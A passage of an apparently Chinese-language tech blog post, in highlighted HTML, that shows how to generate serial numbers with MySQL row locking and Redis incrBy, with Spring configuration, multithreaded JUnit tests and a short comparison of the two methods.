class=\"built_in\">this</span>.expire = expire;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">abstract</span> String <span class=\"title function_\">scope</span><span class=\"params\">()</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>创建service进行操作</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Service</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">SerialNumberService</span> &#123;</span><br><span class=\"line\">    <span class=\"meta\">@Autowired</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> SerialNumberMapper serialNumberMapper;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Transactional(propagation = Propagation.REQUIRES_NEW,rollbackFor = Exception.class)</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> Integer <span class=\"title function_\">mysqlSerialNumber</span><span class=\"params\">(SerialNumber serialNumber, <span class=\"type\">int</span> inrc)</span> &#123;</span><br><span class=\"line\">        serialNumberMapper.insertWithUpdateIncr(serialNumber, inrc);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> serialNumberMapper.selectNum(serialNumber);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>如上，直接对数据库数据进行插入更新操作，之后对数据进行查询，获取最新值。<br>这种在并发的时候也保证数据正常是因为之前设置了唯一索引，在对数据进行插入更新操作时会对当前数据进行加锁，此时如果存在其他事务中对该数据进行操作就会进入锁等待，直到上个事务释放锁，所以之后的查询操作保证了数据为当前更新后的最新值。如果是对不同数据进行操作，不会发生锁竞争。<br>注：此处事务传播级别采用的是<code>Propagation.REQUIRES_NEW</code>，创建一个于原先事务无关的事务，这样避免了因调用端事务执行时间过长导致其他线程一直等待。这种缺点在于如果在调用生成流水号后调用方出现异常，那么会导致序列化不连续。</p>\n<p>编写单元测试：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@RunWith(SpringJUnit4ClassRunner.class)</span></span><br><span class=\"line\"><span class=\"meta\">@ContextConfiguration(locations = &quot;classpath*:applicationContext.xml&quot;)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">SerialNumberServiceTest</span> &#123;</span><br><span class=\"line\">    <span class=\"meta\">@Autowired</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> SerialNumberService serialNumberService;</span><br><span class=\"line\">    <span class=\"meta\">@Autowired</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> SerialNumberMapper serialNumberMapper;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Test</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">mysqlSerialNumber</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"keyword\">final</span> <span class=\"type\">SerialNumber</span> <span class=\"variable\">serialNumber</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">SerialNumber</span>(<span class=\"string\">&quot;ITEM&quot;</span>, <span class=\"string\">&quot;1001_K000011&quot;</span>, SerialSignEnum.D);</span><br><span class=\"line\">        <span class=\"keyword\">final</span> <span class=\"type\">int</span> <span class=\"variable\">incr</span> <span class=\"operator\">=</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"type\">Integer</span> <span class=\"variable\">oldNum</span> <span class=\"operator\">=</span> serialNumberMapper.selectNum(serialNumber);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (oldNum == <span class=\"literal\">null</span>)oldNum =<span class=\"number\">0</span>;</span><br><span class=\"line\">        serialNumberService.mysqlSerialNumber(serialNumber, incr);</span><br><span class=\"line\">        <span class=\"keyword\">assert</span> serialNumberMapper.selectNum(serialNumber) == oldNum + incr;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Test</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">mysqlSerialNumberSingleKey</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">long</span> <span class=\"variable\">startTime</span> <span class=\"operator\">=</span> System.currentTimeMillis();</span><br><span class=\"line\">        <span class=\"keyword\">final</span> <span class=\"type\">SerialNumber</span> <span class=\"variable\">serialNumber</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">SerialNumber</span>(<span class=\"string\">&quot;ITEM&quot;</span>, <span class=\"string\">&quot;1001_K00005&quot;</span>, SerialSignEnum.D);</span><br><span class=\"line\">        <span class=\"type\">Integer</span> <span class=\"variable\">oldNum</span> <span class=\"operator\">=</span> serialNumberMapper.selectNum(serialNumber);</span><br><span class=\"line\">        <span class=\"keyword\">final</span> <span class=\"type\">int</span> <span class=\"variable\">incr</span> <span class=\"operator\">=</span> <span class=\"number\">10</span>;</span><br><span class=\"line\">        <span class=\"keyword\">final</span> <span class=\"type\">int</span> <span class=\"variable\">threadNum</span> <span class=\"operator\">=</span> <span class=\"number\">10</span>;</span><br><span class=\"line\">        <span class=\"keyword\">final</span> <span class=\"type\">int</span> <span class=\"variable\">threadTime</span> <span class=\"operator\">=</span> <span class=\"number\">100</span>;</span><br><span class=\"line\">        Thread[] threads = <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>[threadNum];</span><br><span class=\"line\">        <span class=\"type\">CountDownLatch</span> <span class=\"variable\">downLatch</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">CountDownLatch</span>(threadNum);</span><br><span class=\"line\"></span><br><span class=\"line\">        Integer[] serialNums = <span class=\"keyword\">new</span> <span class=\"title class_\">Integer</span>[threadNum * threadTime];</span><br><span class=\"line\">        IntStream.range(<span class=\"number\">0</span>, threadNum).forEach((i) -&gt; threads[i] = <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(() -&gt; &#123;</span><br><span class=\"line\">            <span class=\"comment\">//线程并发执行，返回值存入集合，空间换时间</span></span><br><span class=\"line\">            IntStream.range(<span class=\"number\">0</span>, threadTime).forEach((j) -&gt; serialNums[i * threadTime + j] = serialNumberService.mysqlSerialNumber(serialNumber, incr));</span><br><span class=\"line\">            downLatch.countDown();</span><br><span class=\"line\">        &#125;));</span><br><span class=\"line\">        Arrays.stream(threads).forEach(Thread::start);</span><br><span class=\"line\">        downLatch.await();</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;耗时：&quot;</span> + (System.currentTimeMillis() - startTime));</span><br><span class=\"line\">        <span class=\"comment\">//验证最终值是否和理想一致</span></span><br><span class=\"line\">        <span class=\"keyword\">assert</span> serialNumberMapper.selectNum(serialNumber) == oldNum + threadNum * threadTime * incr;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//验证是否重复生成</span></span><br><span class=\"line\">        Set&lt;Integer&gt; set = <span class=\"keyword\">new</span> <span class=\"title class_\">HashSet</span>&lt;&gt;(Arrays.asList(serialNums));</span><br><span class=\"line\">        <span class=\"keyword\">assert</span> set.size() == serialNums.length;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Test</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">mysqlSerialNumberRandomKey</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">long</span> <span class=\"variable\">startTime</span> <span class=\"operator\">=</span> System.currentTimeMillis();</span><br><span class=\"line\">        <span class=\"keyword\">final</span> <span class=\"type\">int</span> <span class=\"variable\">incr</span> <span class=\"operator\">=</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"keyword\">final</span> <span class=\"type\">int</span> <span class=\"variable\">threadNum</span> <span class=\"operator\">=</span> <span class=\"number\">10</span>;</span><br><span class=\"line\">        <span class=\"keyword\">final</span> <span class=\"type\">int</span> <span class=\"variable\">threadTime</span> <span class=\"operator\">=</span> <span class=\"number\">1000</span>;</span><br><span class=\"line\">        <span class=\"keyword\">final</span> <span class=\"type\">int</span> <span class=\"variable\">itemNum</span> <span class=\"operator\">=</span> <span class=\"number\">20</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">final</span> SerialNumber[] serialNumbers = <span class=\"keyword\">new</span> <span class=\"title class_\">SerialNumber</span>[itemNum];</span><br><span class=\"line\">        <span class=\"type\">CountDownLatch</span> <span class=\"variable\">downLatch</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">CountDownLatch</span>(threadNum);</span><br><span class=\"line\">        <span class=\"comment\">//随机设置值</span></span><br><span class=\"line\">        IntStream.range(<span class=\"number\">0</span>, itemNum).forEach((i) -&gt;&#123;</span><br><span class=\"line\">            <span class=\"type\">Random</span> <span class=\"variable\">random</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Random</span>();</span><br><span class=\"line\">            <span class=\"type\">DecimalFormat</span> <span class=\"variable\">format</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">DecimalFormat</span>(<span class=\"string\">&quot;00000&quot;</span>);</span><br><span class=\"line\">            serialNumbers[i] = <span class=\"keyword\">new</span> <span class=\"title class_\">SerialNumber</span>(<span class=\"string\">&quot;ITEM&quot;</span>, <span class=\"string\">&quot;1001_K&quot;</span> + format.format(random.nextInt(itemNum) + <span class=\"number\">1</span>), SerialSignEnum.D);</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">        <span class=\"comment\">//记录线程返回值</span></span><br><span class=\"line\">        <span class=\"keyword\">final</span> Integer[] signNums = <span class=\"keyword\">new</span> <span class=\"title class_\">Integer</span>[threadNum * threadTime];</span><br><span class=\"line\">        <span class=\"comment\">//记录线程请求</span></span><br><span class=\"line\">        <span class=\"keyword\">final</span> SerialNumber[] signSerialNumbers = <span class=\"keyword\">new</span> <span class=\"title class_\">SerialNumber</span>[threadNum * threadTime];</span><br><span class=\"line\">        <span class=\"keyword\">final</span> Thread[] threads = <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>[threadNum];</span><br><span class=\"line\">        IntStream.range(<span class=\"number\">0</span>, threadNum).forEach((i) -&gt; threads[i] = <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(() -&gt; &#123;</span><br><span class=\"line\">            IntStream.range(<span class=\"number\">0</span>, threadTime).forEach((j) -&gt; &#123;</span><br><span class=\"line\">                <span class=\"comment\">//线程随机选择需要执行条件</span></span><br><span class=\"line\">                <span class=\"type\">Random</span> <span class=\"variable\">random</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Random</span>();</span><br><span class=\"line\">                <span class=\"type\">SerialNumber</span> <span class=\"variable\">serialNumber</span> <span class=\"operator\">=</span> serialNumbers[random.nextInt(<span class=\"number\">20</span>)];</span><br><span class=\"line\">                <span class=\"comment\">//记录执行的请求、返回值</span></span><br><span class=\"line\">                signNums[i * threadTime + j] = serialNumberService.mysqlSerialNumber(serialNumber, incr);</span><br><span class=\"line\">                signSerialNumbers[i * threadTime + j] = serialNumber;</span><br><span class=\"line\">            &#125;);</span><br><span class=\"line\">            downLatch.countDown();</span><br><span class=\"line\">        &#125;));</span><br><span class=\"line\">        Arrays.stream(threads).forEach(Thread::start);</span><br><span class=\"line\"></span><br><span class=\"line\">        downLatch.await();</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;耗时：&quot;</span> + (System.currentTimeMillis() - startTime));</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//汇总返回数据</span></span><br><span class=\"line\">        Map&lt;String, List&lt;Integer&gt;&gt; serialNumMap = <span class=\"keyword\">new</span> <span class=\"title class_\">HashMap</span>&lt;&gt;();</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; signNums.length; i++) &#123;</span><br><span class=\"line\">            List&lt;Integer&gt; numList = serialNumMap.computeIfAbsent(signSerialNumbers[i].getGroupKey(), k -&gt; <span class=\"keyword\">new</span> <span class=\"title class_\">ArrayList</span>&lt;&gt;());</span><br><span class=\"line\">            numList.add(signNums[i]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">//验证展示是否符合需求</span></span><br><span class=\"line\">        serialNumMap.forEach((key, value) -&gt;&#123;</span><br><span class=\"line\">            Set&lt;Integer&gt; set = <span class=\"keyword\">new</span> <span class=\"title class_\">HashSet</span>&lt;&gt;(value);</span><br><span class=\"line\">            <span class=\"keyword\">assert</span> set.size() == value.size();</span><br><span class=\"line\">            System.out.printf(<span class=\"string\">&quot;key:&quot;</span> + key);</span><br><span class=\"line\">            value.sort(Integer::compareTo);</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot; num: &quot;</span> + value);</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>创建3个测试用例：<br>1、普通调用<br>2、多线程并发调同一条数据<br>3、多线程并发调随机调用不同数据</p>\n<h4 id=\"redis生成流水号\"><a href=\"#redis生成流水号\" class=\"headerlink\" title=\"redis生成流水号\"></a>redis生成流水号</h4><p>添加redis、spring-data-redis依赖，service新增方法。<br>spring配置redis如下</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;jedisPoolConfig&quot;</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;redis.clients.jedis.JedisPoolConfig&quot;</span>/&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;jedisConnectionFactory&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">        <span class=\"attr\">class</span>=<span class=\"string\">&quot;org.springframework.data.redis.connection.jedis.JedisConnectionFactory&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;hostName&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;localhost&quot;</span>/&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;port&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;6379&quot;</span>/&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;timeout&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;1800&quot;</span>/&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;poolConfig&quot;</span> <span class=\"attr\">ref</span>=<span class=\"string\">&quot;jedisPoolConfig&quot;</span>/&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;usePool&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;true&quot;</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;redisTemplate&quot;</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;org.springframework.data.redis.core.StringRedisTemplate&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;connectionFactory&quot;</span> <span class=\"attr\">ref</span>=<span class=\"string\">&quot;jedisConnectionFactory&quot;</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Autowired</span></span><br><span class=\"line\"><span class=\"keyword\">private</span> RedisTemplate redisTemplate;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> Long <span class=\"title function_\">redisSerialNumber</span><span class=\"params\">(SerialNumber serialNumber, <span class=\"keyword\">final</span> <span class=\"type\">int</span> inrc)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span>  (Long)redisTemplate.execute((RedisCallback&lt;Long&gt;) connection -&gt; &#123;</span><br><span class=\"line\">        <span class=\"type\">byte</span>[] keyBytes = (serialNumber.getGroupCode() + <span class=\"string\">&quot;_&quot;</span> + serialNumber.getGroupKey() + <span class=\"string\">&quot;_&quot;</span> + serialNumber.getScope()).getBytes();</span><br><span class=\"line\">        <span class=\"type\">Long</span> <span class=\"variable\">incr</span> <span class=\"operator\">=</span> connection.incrBy(keyBytes, inrc);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (serialNumber.getSign().getExpire() != <span class=\"literal\">null</span> &amp;&amp; incr == inrc)&#123;</span><br><span class=\"line\">            connection.expire(keyBytes, serialNumber.getSign().getExpire());</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> incr;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这里通过redis中<code>incrBy</code>方法对值进行递增，因为redis是单线程，所以保证线程的并发。<br>在构造key时，因为使用了scope确定了时间，当时间到下一个重新计算时，key会发生改变，计数又会从0开始。同时对</p>\n<p>添加测试用例：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Test</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">redisSerialNumber</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"type\">SerialNumber</span> <span class=\"variable\">serialNumber</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">SerialNumber</span>(<span class=\"string\">&quot;ITEM&quot;</span>, <span class=\"string\">&quot;1001_K000011&quot;</span>, SerialSignEnum.D);</span><br><span class=\"line\">    <span class=\"type\">Long</span> <span class=\"variable\">num</span> <span class=\"operator\">=</span> serialNumberService.redisSerialNumber(serialNumber, <span class=\"number\">10</span>);</span><br><span class=\"line\">    System.out.println(num);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Test</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">redisSerialNumberSingleKey</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">    <span class=\"type\">long</span> <span class=\"variable\">startTime</span> <span class=\"operator\">=</span> System.currentTimeMillis();</span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"type\">SerialNumber</span> <span class=\"variable\">serialNumber</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">SerialNumber</span>(<span class=\"string\">&quot;ITEM&quot;</span>, <span class=\"string\">&quot;1001_K00005&quot;</span>, SerialSignEnum.D);</span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"type\">int</span> <span class=\"variable\">incr</span> <span class=\"operator\">=</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"type\">int</span> <span class=\"variable\">threadNum</span> <span class=\"operator\">=</span> <span class=\"number\">10</span>;</span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"type\">int</span> <span class=\"variable\">threadTime</span> <span class=\"operator\">=</span> <span class=\"number\">100</span>;</span><br><span class=\"line\">    Thread[] threads = <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>[threadNum];</span><br><span class=\"line\">    <span class=\"type\">CountDownLatch</span> <span class=\"variable\">downLatch</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">CountDownLatch</span>(threadNum);</span><br><span class=\"line\"></span><br><span class=\"line\">    Long[] serialNums = <span class=\"keyword\">new</span> <span class=\"title class_\">Long</span>[threadNum * threadTime];</span><br><span class=\"line\">    IntStream.range(<span class=\"number\">0</span>, threadNum).forEach((i) -&gt; threads[i] = <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(() -&gt; &#123;</span><br><span class=\"line\">        <span class=\"comment\">//线程并发执行，返回值存入集合，空间换时间</span></span><br><span class=\"line\">        IntStream.range(<span class=\"number\">0</span>, threadTime).forEach((j) -&gt; serialNums[i * threadTime + j] = serialNumberService.redisSerialNumber(serialNumber, incr));</span><br><span class=\"line\">        downLatch.countDown();</span><br><span class=\"line\">    &#125;));</span><br><span class=\"line\">    Arrays.stream(threads).forEach(Thread::start);</span><br><span class=\"line\">    downLatch.await();</span><br><span class=\"line\">    System.out.println(<span class=\"string\">&quot;耗时：&quot;</span> + (System.currentTimeMillis() - startTime));</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//验证是否重复生成</span></span><br><span class=\"line\">    Set&lt;Long&gt; set = <span class=\"keyword\">new</span> <span class=\"title class_\">HashSet</span>&lt;&gt;(Arrays.asList(serialNums));</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> set.size() == serialNums.length;</span><br><span class=\"line\">    Arrays.sort(serialNums);</span><br><span class=\"line\">    System.out.println(Arrays.toString(serialNums));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Test</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">redisSerialNumberRandomKey</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">    <span class=\"type\">long</span> <span class=\"variable\">startTime</span> <span class=\"operator\">=</span> System.currentTimeMillis();</span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"type\">int</span> <span class=\"variable\">incr</span> <span class=\"operator\">=</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"type\">int</span> <span class=\"variable\">threadNum</span> <span class=\"operator\">=</span> <span class=\"number\">10</span>;</span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"type\">int</span> <span class=\"variable\">threadTime</span> <span class=\"operator\">=</span> <span class=\"number\">10000</span>;</span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"type\">int</span> <span class=\"variable\">itemNum</span> <span class=\"operator\">=</span> <span class=\"number\">20</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">final</span> SerialNumber[] serialNumbers = <span class=\"keyword\">new</span> <span class=\"title class_\">SerialNumber</span>[itemNum];</span><br><span class=\"line\">    <span class=\"type\">CountDownLatch</span> <span class=\"variable\">downLatch</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">CountDownLatch</span>(threadNum);</span><br><span class=\"line\">    <span class=\"comment\">//随机设置值</span></span><br><span class=\"line\">    IntStream.range(<span class=\"number\">0</span>, itemNum).forEach((i) -&gt; &#123;</span><br><span class=\"line\">        <span class=\"type\">Random</span> <span class=\"variable\">random</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Random</span>();</span><br><span class=\"line\">        <span class=\"type\">DecimalFormat</span> <span class=\"variable\">format</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">DecimalFormat</span>(<span class=\"string\">&quot;00000&quot;</span>);</span><br><span class=\"line\">        serialNumbers[i] = <span class=\"keyword\">new</span> <span class=\"title class_\">SerialNumber</span>(<span class=\"string\">&quot;ITEM&quot;</span>, <span class=\"string\">&quot;1001_K&quot;</span> + format.format(random.nextInt(itemNum) + <span class=\"number\">1</span>), SerialSignEnum.D);</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">    <span class=\"comment\">//记录线程返回值</span></span><br><span class=\"line\">    <span class=\"keyword\">final</span> Long[] signNums = <span class=\"keyword\">new</span> <span class=\"title class_\">Long</span>[threadNum * threadTime];</span><br><span class=\"line\">    <span class=\"comment\">//记录线程请求</span></span><br><span class=\"line\">    <span class=\"keyword\">final</span> SerialNumber[] signSerialNumbers = <span class=\"keyword\">new</span> <span class=\"title class_\">SerialNumber</span>[threadNum * threadTime];</span><br><span class=\"line\">    <span class=\"keyword\">final</span> Thread[] threads = <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>[threadNum];</span><br><span class=\"line\">    IntStream.range(<span class=\"number\">0</span>, threadNum).forEach((i) -&gt; threads[i] = <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(() -&gt; &#123;</span><br><span class=\"line\">        IntStream.range(<span class=\"number\">0</span>, threadTime).forEach((j) -&gt; &#123;</span><br><span class=\"line\">            <span class=\"comment\">//线程随机选择需要执行条件</span></span><br><span class=\"line\">            <span class=\"type\">Random</span> <span class=\"variable\">random</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Random</span>();</span><br><span class=\"line\">            <span class=\"type\">SerialNumber</span> <span class=\"variable\">serialNumber</span> <span class=\"operator\">=</span> serialNumbers[random.nextInt(<span class=\"number\">20</span>)];</span><br><span class=\"line\">            <span class=\"comment\">//记录执行的请求、返回值</span></span><br><span class=\"line\">            signNums[i * threadTime + j] = serialNumberService.redisSerialNumber(serialNumber, incr);</span><br><span class=\"line\">            signSerialNumbers[i * threadTime + j] = serialNumber;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">        downLatch.countDown();</span><br><span class=\"line\">    &#125;));</span><br><span class=\"line\">    Arrays.stream(threads).forEach(Thread::start);</span><br><span class=\"line\"></span><br><span class=\"line\">    downLatch.await();</span><br><span class=\"line\">    System.out.println(<span class=\"string\">&quot;耗时：&quot;</span> + (System.currentTimeMillis() - startTime));</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//汇总返回数据</span></span><br><span class=\"line\">    Map&lt;String, List&lt;Long&gt;&gt; serialNumMap = <span class=\"keyword\">new</span> <span class=\"title class_\">HashMap</span>&lt;&gt;();</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; signNums.length; i++) &#123;</span><br><span class=\"line\">        List&lt;Long&gt; numList = serialNumMap.computeIfAbsent(signSerialNumbers[i].getGroupKey(), k -&gt; <span class=\"keyword\">new</span> <span class=\"title class_\">ArrayList</span>&lt;&gt;());</span><br><span class=\"line\">        numList.add(signNums[i]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//验证展示是否符合需求</span></span><br><span class=\"line\">    serialNumMap.forEach((key, value) -&gt; &#123;</span><br><span class=\"line\">        Set&lt;Long&gt; set = <span class=\"keyword\">new</span> <span class=\"title class_\">HashSet</span>&lt;&gt;(value);</span><br><span class=\"line\">        <span class=\"keyword\">assert</span> set.size() == value.size();</span><br><span class=\"line\">        System.out.printf(<span class=\"string\">&quot;key:&quot;</span> + key);</span><br><span class=\"line\">        value.sort(Long::compareTo);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot; num: &quot;</span> + value);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>测试用例和之前一样，只是调用的方法改了。</p>\n<h4 id=\"两种流水号生成优缺点\"><a href=\"#两种流水号生成优缺点\" class=\"headerlink\" title=\"两种流水号生成优缺点\"></a>两种流水号生成优缺点</h4><p>mysql：使用方便，不需要而外维护其他应用，因为需要维护redis服务器比较麻烦。缺点是生成速度较慢，适合压力不大的地方。<br>redis：使用相对麻烦，需要专门维护redis服务器，优点是速度极快。</p>\n<h3 id=\"合并两个功能\"><a href=\"#合并两个功能\" class=\"headerlink\" title=\"合并两个功能\"></a>合并两个功能</h3><p>需求是需要生成流水号，然后和之前业务合并插入数据库。<br>在原先的item表中添加<code>serial_num</code>字段，mappper新增插入sql <code>insertNotExist2</code>。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Autowired</span></span><br><span class=\"line\"><span class=\"keyword\">private</span> SerialNumberService serialNumberService;</span><br><span class=\"line\"><span class=\"meta\">@Transactional</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"type\">int</span> <span class=\"title function_\">createItem</span><span class=\"params\">(String skuCode, Integer num)</span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//构造流水号</span></span><br><span class=\"line\">    <span class=\"type\">SerialNumber</span> <span class=\"variable\">serialNumber</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">SerialNumber</span>(<span class=\"string\">&quot;ITEM&quot;</span>, <span class=\"string\">&quot;1001&quot;</span>, SerialSignEnum.D);</span><br><span 